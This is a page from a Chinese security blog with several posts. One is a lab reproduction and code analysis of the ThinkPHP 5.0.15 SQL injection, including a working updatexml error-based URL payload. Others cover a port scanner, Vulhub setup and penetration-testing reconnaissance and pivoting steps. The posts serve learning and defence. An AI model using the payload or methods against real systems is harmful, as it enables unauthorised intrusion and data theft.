<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>可乐&#39;blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="只会复现的菜鸡">
<meta property="og:type" content="website">
<meta property="og:title" content="可乐&#39;blog">
<meta property="og:url" content="https://style-404.github.io/page/2/index.html">
<meta property="og:site_name" content="可乐&#39;blog">
<meta property="og:description" content="只会复现的菜鸡">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="可乐&#39;blog">
<meta name="twitter:description" content="只会复现的菜鸡">
  
    <link rel="alternate" href="/atom.xml" title="可乐&#39;blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">可乐&#39;blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://style-404.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-ThinkPHP-框架-5-0-15-SQL-注入分析" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/31/ThinkPHP-框架-5-0-15-SQL-注入分析/" class="article-date">
  <time datetime="2019-03-30T16:25:42.000Z" itemprop="datePublished">2019-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/31/ThinkPHP-框架-5-0-15-SQL-注入分析/">ThinkPHP 框架 5.0.15 SQL 注入分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在thinkphp5.0.16 之前存在一个sql注入漏洞,在insert和update 方法中 传入参数可控,且无严格过滤，最终导致本次 SQL 注入漏洞发生。<br>条件:漏洞的利用是建立在thinkphp接受数组形式的参数的基础上，虽然这种写法在查询中非常少见，但是在更新、插入的时候还是有相应的需求的。</p>
<h1 id="环境搭建与复现"><a href="#环境搭建与复现" class="headerlink" title="环境搭建与复现"></a>环境搭建与复现</h1><p>thinkphp 官网下载 5.0.14 版本下载：<a href="http://www.thinkphp.cn/down/1107.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1107.html</a></p>
<p>下载访问public目录<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lagv6yubj30oy0c9mxv.jpg" alt=""></p>
<p>接下来创建数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> thinkphp;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(<span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,username <span class="built_in">varchar</span>(<span class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"test"</span>,<span class="string">"thinkphp"</span>);</span><br></pre></td></tr></table></figure></p>
<p>在 <code>\application\database.php</code> 中配置好数据库<br>同时在congfig.php中将app_debug开为true<br>接下来在<code>\application\index\controller\Index.php</code><br>写一个 update 功能的 demo<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$username</span> = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">  /<span class="regexp">/ dump($password)."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ echo(db('user')-&gt;where(['id'=&gt;1])-&gt;update(['password'=&gt;$password]))."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  Db::table("user")-&gt;where(["id"=&gt;1])-&gt;insert(["username"=&gt;$username]);</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/dump(Db::table('user')-&gt;where('id',1)-&gt;find());</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$n</span>ame = input(<span class="comment">"get.username/a"</span>);</span><br></pre></td></tr></table></figure>
<p>input()为TP框架的助手函数，get.name/a 表示获取get传入的name变量，并将其强制转换为数组类型<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::table<span class="function"><span class="params">(<span class="string">"user"</span>)</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">"id"</span>=&gt;<span class="number">1</span>])</span>-&gt;</span>insert([<span class="string">"username"</span>=&gt;$username]);</span><br></pre></td></tr></table></figure></p>
<p>用来向数据库中插入数据<br>接下来访问<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php/index/index/index?username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lutdt6uoj31160dwjt8.jpg" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当输入数据<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>由input()获得数据<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lw2y09s4j30i004ggn9.jpg" alt=""></p>
<p>接着调用了update()方法 在thinkphp/library/think/db/Query.php:2078<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwd536fhj30sk0dydhl.jpg" alt=""><br>在 2094 行会调用thinkphp/library/think/db/Builder.php:720： 下的insert()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwfmeyfkj30km0dl0tx.jpg" alt=""><br>接着会调用parseData()解析数据 在/library/think/db/Builder.php:86<br>从101 行开始分析:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwlm2ja0j30p50ia0uu.jpg" alt=""><br>将变量赋给$key 值赋给$var 即:<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key : <span class="string">"username"</span></span><br><span class="line">$val : &#123;<span class="string">"inc"</span>,<span class="string">"updatexml(1,concat(0x7,user(),0x7e),1)"</span>,<span class="string">"1"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>当$val[0] = inc 时 将$val[1] 与 $var[2] 进行拼接<br>虽然调用parseKey()处理 在thinkphp/library/think/db/builder/Mysql.php:90</p>
<p>可见并没有什么过滤，不过在某些情况下会用反引号把字段的值包起来，可能会影响payload的构造。</p>
<p>floatval()是将数据转化为浮点数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lx6wd4e5j30gb05nq2z.jpg" alt=""></p>
<p>接着回到 thinkphp/library/think/db/Query.php 的 insert 中：</p>
<p>在updata()中同样调用了parseData()函数 因此原理和利用是一样的</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lxdjwnw6j30pm0gkgnc.jpg" alt=""><br>只有当$val[1]==$key键值时才能进行拼接</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.ichunqiu.com/thread-38284-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38284-1-1.html</a><br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a><br><a href="https://xz.aliyun.com/t/2812#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812#toc-5</a><br><a href="https://seaii-blog.com/index.php/2018/04/08/80.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2018/04/08/80.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/31/ThinkPHP-框架-5-0-15-SQL-注入分析/" data-id="cjvrp4gir000n5gqrxxr8l7jb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-使用Xshell玩服务器" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/30/使用Xshell玩服务器/" class="article-date">
  <time datetime="2019-03-30T08:45:14.000Z" itemprop="datePublished">2019-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/30/使用Xshell玩服务器/">使用Xshell玩服务器</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们购买ubuntu服务器时 默认只能用ubuntu取登入  很多权限多用不了<br>接下来使用Xshell进行连接连接服务器</p>
<h1 id="Xshell连接服务器"><a href="#Xshell连接服务器" class="headerlink" title="Xshell连接服务器"></a>Xshell连接服务器</h1><p>在腾讯云下载ssh秘钥(我用的是腾讯云的服务器)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx6mkz2uj30fj07mwf3.jpg" alt=""></p>
<p>然后使用Xshell连接<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7gfzizj30ho0f6wgn.jpg" alt=""></p>
<p>输入公网ip然后点击连接<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7uss7ej30dn06omxt.jpg" alt=""></p>
<p>然后导入秘钥即可连接成功<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx8ebjjsj30er0bpgnj.jpg" alt=""></p>
<h1 id="获得root权限"><a href="#获得root权限" class="headerlink" title="获得root权限"></a>获得root权限</h1><p>先用ubuntu登入服务器，然后我们输入sudo passwd root  进行修改root密码</p>
<p>然后我们输入sudo vi /etc/ssh/sshd_config,将第二个改为yes</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxbnbfhrj309k027t8j.jpg" alt=""></p>
<p>wq保存。</p>
<p>然后我们输入sudo service ssh restart 点回车 。接下来就可以用root登入了</p>
<p>如果在登入中不能使用密码登入的话,<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxnnusrqj30dx0ch3z2.jpg" alt=""><br>修改如下文件：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p>
<p>将该配置改为yes：</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxon9xphj30mz0dowft.jpg" alt=""><br>接着保存退出,然后重启sshd服务</p>
<p>service sshd restart</p>
<p>然后用xshell重新登陆，就可以出现输入密码的界面了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/30/使用Xshell玩服务器/" data-id="cjvrp4gkv001v5gqrvr8a41js" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-docker学习及Vulhub搭建" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/28/docker学习及Vulhub搭建/" class="article-date">
  <time datetime="2019-03-28T13:56:56.000Z" itemprop="datePublished">2019-03-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/28/docker学习及Vulhub搭建/">docker学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在ubuntu下<br>1、更新系统软件<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p>
<p>2、安装依赖包<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install apt-transport-https</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install ca-certificates</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install curl</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> installsoft ware-properties-common</span><br></pre></td></tr></table></figure></p>
<p>3、添加官方密钥<br>执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。（建议更换源）<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>curl -fsSL <span class="symbol">https:</span>/<span class="regexp">/download.docker.com/linux</span><span class="regexp">/ubuntu/gpg</span> | sudo apt-key add -</span><br></pre></td></tr></table></figure></p>
<p>显示OK,表示添加成功.</p>
<p>4、添加仓库<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo<span class="built_in"> add-apt-repository </span><span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span></span><br></pre></td></tr></table></figure></p>
<p>5、再次更新软件<br>我们需要再次把软件更新到最新，否则下一步有可能会报错，（ubuntu源自行更换为国内源，推荐阿里源）<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p>
<p>6、安装docker<br>默认就会安装最新版<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install docker-ce</span><br></pre></td></tr></table></figure></p>
<p>7、查看docker版本<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker -v</span><br></pre></td></tr></table></figure></p>
<p>显示“Docker version xx.xx.x-ce, build afdb6d4”字样，表示安装成功。</p>
<p>8.安装docker-compose</p>
<p>pip install docker-compose<br> 没有pip 建议先安装pip （python3可选）</p>
<p> curl -s <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> | python</p>
<h1 id="玩转容器与镜像"><a href="#玩转容器与镜像" class="headerlink" title="玩转容器与镜像"></a>玩转容器与镜像</h1><p>可以先使用<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span>   <span class="comment">// 查看运行中的docker容器</span></span><br></pre></td></tr></table></figure></p>
<p>然后使用如下命令进入一个容器<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> docker attach <span class="variable">$id</span></span><br></pre></td></tr></table></figure></p>
<p>退出容器:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + <span class="keyword">D</span></span><br></pre></td></tr></table></figure></p>
<h1 id="利用Vulhub"><a href="#利用Vulhub" class="headerlink" title="利用Vulhub"></a>利用Vulhub</h1><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。<br>下载环境<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure></p>
<p>搭建一个thinkphp 的漏洞环境</p>
<p>进入thinkphp目录：vulhub/thinkphp/in-sqlinjection<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ix2uwxw1j30nk05w3z6.jpg" alt=""></p>
<p>然后运行如下命令<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p>
<p>然后运行如下命令 查看映射到哪个端口 然后用 外网+端口 访问即可<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure></p>
<p>运行命令： docker-compose up -d</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md" target="_blank" rel="noopener">https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/28/docker学习及Vulhub搭建/" data-id="cjvrp4giv000t5gqru15qi34l" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python编写的简单端口扫描器" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/26/python编写的简单端口扫描器/" class="article-date">
  <time datetime="2019-03-26T14:01:04.000Z" itemprop="datePublished">2019-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/26/python编写的简单端口扫描器/">python编写的简单端口扫描器</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>python3下 运行成功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connScan</span><span class="params">(tgtHost, tgtPort)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        connSkt.connect((tgtHost, tgtPort))</span><br><span class="line">        print(<span class="string">"[+]%d/tcp open"</span> % tgtPort)</span><br><span class="line">        connSkt.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]%d/tcp close"</span> % tgtPort)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(tgtHost)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtIP = socket.gethostbyname(tgtHost)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]cannot connect %s"</span> % tgtIP)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtName = socket.gethostbyaddr(tgtIP)</span><br><span class="line">        print(<span class="string">"\n[+]Scan results for:"</span> + tgtName[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\n[+]scan results for:"</span> + tgtIP)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">80</span>, <span class="number">90</span>):</span><br><span class="line">            print(<span class="string">"scanning port:"</span> + str(port))</span><br><span class="line">            connScan(tgtHost, int(port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-H"</span>, <span class="string">"--Host"</span>, dest=<span class="string">'tgtHost'</span>, help=<span class="string">'input Host address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    <span class="keyword">if</span> (tgtHost == <span class="keyword">None</span>):</span><br><span class="line">        print(<span class="string">'----you must input Host-----'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    portScan(tgtHost)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/26/python编写的简单端口扫描器/" data-id="cjvrp4gkc001d5gqrfmva633w" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-渗透测试流程" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/25/渗透测试流程/" class="article-date">
  <time datetime="2019-03-25T15:00:38.000Z" itemprop="datePublished">2019-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/25/渗透测试流程/">渗透测试流程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下渗透测试的一般流程,以免自己在渗透测试中遗忘</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>真实ip查询<br>常用的工具有多个地点ping服务器-网站测速-站长工具<br>最重要的就是信息收集<br>使用字典枚举目录<br>使用爬虫爬取整个网站，或者使用google等搜索引擎获取<br>查看robots.txt是否泄漏<br>指纹识别<br>使应用程序报错，查看报错信息<br>扫描服务器的数据库端口<br>用到的框架：很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。</p>
<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>搜索引擎（google，baidu，bing）,DNS区域传送漏洞，子域名挖掘机Layer,subDomainsBrute,phpinfo.me,定制字典暴力破解。<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p>
<h2 id="旁站C段查询"><a href="#旁站C段查询" class="headerlink" title="旁站C段查询"></a>旁站C段查询</h2><p>旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有webscancc，Nmap，Zenmap。</p>
<h2 id="cms类型"><a href="#cms类型" class="headerlink" title="cms类型"></a>cms类型</h2><p>对目标渗透测试过程中，目标CMS是十分重要的信息，有了目标的CMS，就可以利用相关的bug进行测试，进行代码审计。CMS识别方式有网站特有文件，例如/templets/default/style/dedecms.css — dedecms；网站独有文件的md5，例如favicon.ico，但是该文件可以被修改导致不准确；网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息；常用的工具有 云悉，工具1，BugScaner。</p>
<h2 id="敏感目录-文件"><a href="#敏感目录-文件" class="headerlink" title="敏感目录/文件"></a>敏感目录/文件</h2><p>用扫描器扫描目录，这时候你需要一本强大的字典，重在平时积累。字典越强扫描处的结果可能越多，这一步主要扫出网站的管理员入口，一些敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用的工具有：御剑，kali下的dirb，DirBrute。</p>
<h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><p>服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大。开始扫描之前不妨使用telnet先简单探测下某些端口是否开放，避免使用扫描器而被封IP，扫描全端口一般使用Nmap，masscan进行扫描探测，尽可能多的搜集开启的端口好已经对应的服务版本，得到确切的服务版本后可以搜索有没有对应版本的漏洞。常见的端口信息及渗透方法。</p>
<h2 id="服务器与中间件信息"><a href="#服务器与中间件信息" class="headerlink" title="服务器与中间件信息"></a>服务器与中间件信息</h2><p>通过Nmap、Zmap等端口和指纹识别功能搜集，也可以使用nc和telnet获取Banner信息进行识别，常用工具有whatweb</p>
<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>扫描SQL注射，XSS,文件包含，命令执行等高危漏洞</p>
<ol>
<li>自动化扫描工具</li>
</ol>
<p>　　　　Burpsuit —— 集成代理，爬行目录，漏扫，表单破解，编码解码，绝对的神器!</p>
<p>　　　　Awvs —— 可以和Burp换着用，效果会更好!</p>
<p>　　　　AppScan ——  IBM出品，以前很火的一款扫描工具!</p>
<p>　　2. 手动测试</p>
<p>　　　　需要耐心 !</p>
<p>　　　　扫描器扫不出逻辑漏洞，一些存储型XSS，和SQL注入漏洞，这些都需要手动测试 。<br>漏洞扫描</p>
<p>关于漏洞扫描的工具太多了，笔者这里仅仅推荐awvs<br>但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞</p>
<p>sql注入</p>
<p>sql注入可以说是非常常见了，相信你在挖掘这类漏洞的时候已经轻车熟路了，掌握常用的sql注入手法已经熟练使用sqlmap或者同类工具都非常重要。但是我们需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</p>
<p>xss漏洞</p>
<p>前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过</p>
<p>xxe漏洞</p>
